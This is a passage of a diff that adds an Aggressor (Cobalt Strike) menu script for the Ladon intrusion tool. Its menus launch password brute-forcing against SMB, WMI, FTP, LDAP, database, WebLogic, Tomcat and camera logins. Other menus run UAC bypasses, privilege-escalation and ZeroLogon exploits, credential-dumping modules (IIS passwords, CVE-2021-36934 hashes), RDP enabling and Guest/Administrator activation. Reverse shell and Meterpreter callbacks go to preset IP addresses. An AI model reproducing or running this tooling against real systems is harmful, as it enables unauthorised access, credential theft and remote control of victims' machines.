+	$dialog = dialog("Ladon SmbHashScan", %(tar => "",moudle => "SmbHashScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "135端口WMI-HASH密码审计(Windows)" {
+	$bid = $1;
+	$dialog = dialog("Ladon WmiHashScan", %(tar => "",moudle => "WmiHashScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "139端口NBT密码审计(Windows)" {
+	$bid = $1;
+	$dialog = dialog("Ladon NbtInfo", %(tar => "",moudle => "NbtInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "5985端口Winrm密码审计(Windows)" {
+
+	}
+	item "21端口FTP密码审计(多平台)" {
+	$bid = $1;
+	$dialog = dialog("Ladon FtpScan", %(tar => "",moudle => "FtpScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "5900端口VNC密码审计(多平台)" {
+
+	}
+	item "389端口LDAP密码审计(Windows)" {
+	$bid = $1;
+	$dialog = dialog("Ladon LdapScan", %(tar => "",moudle => "LdapScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "1521端口Oracle数据库密码审计(多平台)" {
+
+	}
+	item "1433端口SQL数据库密码审计(Windows)" {
+	$bid = $1;
+	$dialog = dialog("Ladon MssqlScan", %(tar => "",moudle => "MssqlScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "3306端口MYSQL数据库密码审计(多平台)" {
+	$bid = $1;
+	$dialog = dialog("Ladon MysqlScan", %(tar => "",moudle => "MysqlScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "7001端口Weblogic后台密码审计(多平台)" {
+	$bid = $1;
+	$dialog = dialog("Ladon WeblogicScan", %(tar => "",moudle => "WeblogicScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Web端口Tomcat后台密码审计(多平台)" {
+	$bid = $1;
+	$dialog = dialog("Ladon TomcatScan", %(tar => "",moudle => "TomcatScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Web端口401基础认证密码审计(多平台)" {
+	$bid = $1;
+	$dialog = dialog("Ladon HttpBasicScan", %(tar => "",moudle => "HttpBasicScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "22端口SSH密码审计(Linux_多平台)" {
+	$bid = $1;
+	$dialog = dialog("该功能未支持", %(tar => "",moudle => "nonono",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "网络摄像头密码审计(401认证)" {
+	$bid = $1;
+	$dialog = dialog("Ladon DvrScan", %(tar => "",moudle => "DvrScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+}
+
+menu "本机执行" {
+	item "sc服务执行(system权限)" {
+	}
+	item "at计划任务(system权限)" {
+	}
+	item "Runas(模拟用户执行)" {
+	}
+	item "RunPS(无powershell执行)" {
+	}
+	item "ForExec(循环执行命令)" {
+	}
+}
+
+menu "远程执行" {
+	item "WinrmExec" {
+	}
+	item "SshExec" {
+	}
+	item "SmbExec" {
+	}
+	item "PsExec" {
+	}
+	item "AtExec" {
+	}
+	item "WmiExec" {
+	}
+	item "WmiExec2" {
+	}
+	item "WinrmExec" {
+	}
+	item "JspShell" {
+	}
+	item "AspShell" {
+	}
+	item "AspxShell" {
+	}
+	item "PhpShell" {
+	}
+}
+
+menu "本地提权" {
+	menu "BypassUac" {
+	item "eventvwr" {
+	}
+	item "fodhelper" {
+	}
+	item "computerdefaults" {
+	}
+	item "sdclt" {
+	}
+	item "slui" {
+	}
+	}
+	item "BypassUac2" {
+	}
+	item "GetSystem" {
+	}
+	item "Runas" {
+	}
+	item "ms16135" {
+	}
+	item "BadPotato" {
+	}
+	item "SweetPotato" {
+	}
+	item "RDPHijack" {
+	}
+	item "CVE-2021-1675" {
+	}
+}
+
+menu "自启动" {
+	item "注册表自启动" {
+	#RegAuto
+	}
+	item "服务启动项" {
+	#sc
+	}
+}
+
+menu "3389远程桌面" {
+	item "一键开启3389" {
+	$bid = $1;
+	$dialog = dialog("Ladon Open3389", %(tar => "",moudle => "Open3389",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "Open3389");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("Open3389"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "查看3389远程连接" {
+	$bid = $1;
+	$dialog = dialog("Ladon RdpLog", %(tar => "",moudle => "RdpLog",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "RdpLog");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("RdpLog"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "查看管理员组用户" {
+	$bid = $1;
+	$dialog = dialog("Ladon QueryAdmin", %(tar => "",moudle => "QueryAdmin",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "QueryAdmin");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("QueryAdmin"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "激活Administrator" {
+	$bid = $1;
+	$dialog = dialog("Ladon ActiveAdmin", %(tar => "",moudle => "ActiveAdmin",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "ActiveAdmin");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("ActiveAdmin"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "激活用户Guest" {
+	$bid = $1;
+	$dialog = dialog("Ladon ActiveGuest", %(tar => "",moudle => "ActiveGuest",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "ActiveGuest");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("ActiveGuest"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "远程桌面会话劫持" {
+	#RDPhijack
+	}
+}
+
+menu "远程下载" {
+	item "Http文件下载" {
+	$bid = $1;
+	$dialog = dialog("Ladon HttpDownLoad", %(tar => "",moudle => "HttpDownLoad",clrver => "35",bid => $bid), &LoadMoudle2);
+	dialog_description($dialog, "Target: url");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "FTP文件下载" {
+	}
+}
+
+menu "域(DC、LDAP)" {
+	item "域内机器信息获取(域内)" {
+	$bid = $1;
+	$dialog = dialog("Ladon AdiDnsDump", %(tar => "",moudle => "AdiDnsDump",clrver => "35",bid => $bid), &LoadMoudle2);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "389端口LDAP服务器探测" {
+	$bid = $1;
+	$dialog = dialog("Ladon LdapScan", %(tar => "",moudle => "LdapScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "389端口LDAP密码审计" {
+	$bid = $1;
+	$dialog = dialog("Ladon LdapScan", %(tar => "",moudle => "LdapScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "CVE-2020-1472域控提权" {
+	$bid = $1;
+	$dialog = dialog("Ladon ZeroLogon", %(tar => "",moudle => "ZeroLogon",clrver => "35",bid => $bid), &LoadMoudle2);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+}
+
+menu "后门/木马查看" {
+	item "注册表启动项" {
+	$bid = $1;
+	$dialog = dialog("Ladon CheckDoor", %(tar => "",moudle => "CheckDoor",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "CheckDoor Regedit AutoRun & dll hijack");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("CheckDoor"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "系统却持DLL" {
+	$bid = $1;
+	$dialog = dialog("Ladon CheckDoor", %(tar => "",moudle => "CheckDoor",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "CheckDoor Regedit AutoRun & dll hijack");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("CheckDoor"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+}
+
+menu "域名解析" {
+	item "Domain2IP" {
+	$bid = $1;
+	$dialog = dialog("Domain2IP", %(tar => "",moudle => "Domain2IP",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Host2IP" {
+	$bid = $1;
+	$dialog = dialog("Host2IP", %(tar => "",moudle => "Host2IP",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+}
+menu "端口转发" {
+	item "netsh(系统自带)" {
+	}
+	item "PortTran" {
+	}
+}
+menu "本机信息收集" {
+		item "查看本机IP(内外网)" {
+		$bid = $1;
+		$dialog = dialog("Ladon GetIP", %(tar => "",moudle => "GetIP",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "GetIP");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("GetIP"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "当前用户、特权信息" {
+		$bid = $1;
+		$dialog = dialog("Ladon Whoami", %(tar => "",moudle => "Whoami",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "GetInfo");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("Whoami"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "GUID、CPUID、DiskID" {
+		$bid = $1;
+		$dialog = dialog("Ladon GetID", %(tar => "",moudle => "GetID",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "HostName、GUID、CPUID、DISKID、MAC");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("GetID"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "基础信息(仅cmd获取)" {
+		$bid = $1;
+		$dialog = dialog("Ladon GetInfo", %(tar => "",moudle => "GetInfo",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "GetInfo");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("GetInfo"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "基础信息(含wmi获取)" {
+		$bid = $1;
+		$dialog = dialog("Ladon GetInfo2", %(tar => "",moudle => "GetInfo2",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "GetInfo2");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("GetInfo2"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "获取命令行参数" {
+		$bid = $1;
+		$dialog = dialog("Ladon CmdLine", %(tar => "",moudle => "CmdLine",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "CmdLine");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("CmdLine"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "获取进程详细信息" {
+		$bid = $1;
+		$dialog = dialog("Ladon Tasklist", %(tar => "",moudle => "Tasklist",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "Tasklist");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("Tasklist"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看IE代理信息" {
+		$bid = $1;
+		$dialog = dialog("Ladon QueryProxy", %(tar => "",moudle => "QueryProxy",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "QueryProxy");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("QueryProxy"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看本机命名管道" {
+		$bid = $1;
+		$dialog = dialog("Ladon GetPipe", %(tar => "",moudle => "GetPipe",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "GetPipe");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("GetPipe"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看3389远程连接" {
+		$bid = $1;
+		$dialog = dialog("Ladon RdpLog", %(tar => "",moudle => "RdpLog",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "RdpLog");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("RdpLog"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看USB使用记录" {
+		$bid = $1;
+		$dialog = dialog("Ladon Usblog", %(tar => "",moudle => "Usblog",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "Usblog");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("Usblog"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看管理员组用户" {
+		$bid = $1;
+		$dialog = dialog("Ladon QueryAdmin", %(tar => "",moudle => "QueryAdmin",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "QueryAdmin");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("QueryAdmin"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看最近访问文件" {
+		$bid = $1;
+		$dialog = dialog("Ladon recent", %(tar => "",moudle => "recent",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "recent");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("recent"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看安装.NET版本" {
+		$bid = $1;
+		$dialog = dialog("Ladon NetVer", %(tar => "",moudle => "NetVer",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "NetVer");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("NetVer"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看PowerShell版本" {
+		$bid = $1;
+		$dialog = dialog("Ladon PsVer", %(tar => "",moudle => "PsVer",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "PsVer");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("PsVer"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "查看已安装程序版本" {
+		$bid = $1;
+		$dialog = dialog("Ladon AllVer", %(tar => "",moudle => "AllVer",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "AllVer");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("AllVer"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+}
+
+menu "本机密码读取" {
+		item "IIS站点密码" {
+		$bid = $1;
+		$dialog = dialog("Ladon IisPwd", %(tar => "",moudle => "IisPwd",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "IisPwd");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("IisPwd"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "CVE-2021-36934" {
+		$bid = $1;
+		$dialog = dialog("Ladon CVE-2021-36934", %(tar => "",moudle => "CVE-2021-36934",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "Get Vpn password、Ntlm-Hash、DPAPI-KEY");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("CVE-2021-36934"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+		}
+		item "DumpLsass" {
+		}
+}
+
+separator();
+menu "MSF/NC联动" {
+item "Shell_bind_tcp" {
+	if (-exists script_resource("K8moudle\\shell\\Invoke-Shellcode.ps1")) {
+		local('$bid');
+		foreach $bid ($1) {
+			bind_tcp($bid);
+		}
+	}
+}
+
+item "Shell_reverse_tcp" {		
+	$bid = $1;
+	$dialog = dialog("Shell_reverse_tcp", %(ip => "192.11.22.40",port => "4444",bid => $bid), &reverse_tcp);
+	drow_text($dialog, "ip",  "IP:");
+	drow_text($dialog, "port",  "Port:");
+	dbutton_action($dialog, "Go");
+	dialog_show($dialog);
+	
+}
+
+item "Met_reverse_http" {		
+	$bid = $1;
+	$dialog = dialog("Met_reverse_http", %(ip => "192.11.22.85",port => "8080",bid => $bid), &met_reverse_http);
+	drow_text($dialog, "ip",  "IP:");
+	drow_text($dialog, "port",  "Port:");
+	dbutton_action($dialog, "Go");
+	dialog_show($dialog);
+}
+item "Met_reverse_https" {		
+	$bid = $1;
+	$dialog = dialog("Met_reverse_https", %(ip => "192.11.22.85",port => "8443",bid => $bid), &met_reverse_https);
+	drow_text($dialog, "ip",  "IP:");
+	drow_text($dialog, "port",  "Port:");
+	dbutton_action($dialog, "Go");
+	dialog_show($dialog);
+}
+item "Shell_reverse_icmp" {		
+	$bid = $1;
+	$dialog = dialog("Shell_reverse_icmp", %(ip => "192.11.22.85",bid => $bid), &reverse_icmp);
+	drow_text($dialog, "ip",  "IP:");
+	dbutton_action($dialog, "Go");
+	dialog_show($dialog);
+	
+}
+item "Shell_reverse_dns" {		
+	$bid = $1;
+	$dialog = dialog("Shell_reverse_icmp", %(ip => "192.11.22.85",bid => $bid), &reverse_icmp);
+	drow_text($dialog, "ip",  "IP:");
+	dbutton_action($dialog, "Go");
+	dialog_show($dialog);
+	
+}
+}
+separator();
+menu "其它功能" {
+	item "网站HTML源码查看" {
+	$bid = $1;
+	$dialog = dialog("Ladon GetHtml", %(tar => "",moudle => "GetHtml",clrver => "35",bid => $bid), &LoadMoudle2);
+	dialog_description($dialog, "Target: url");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
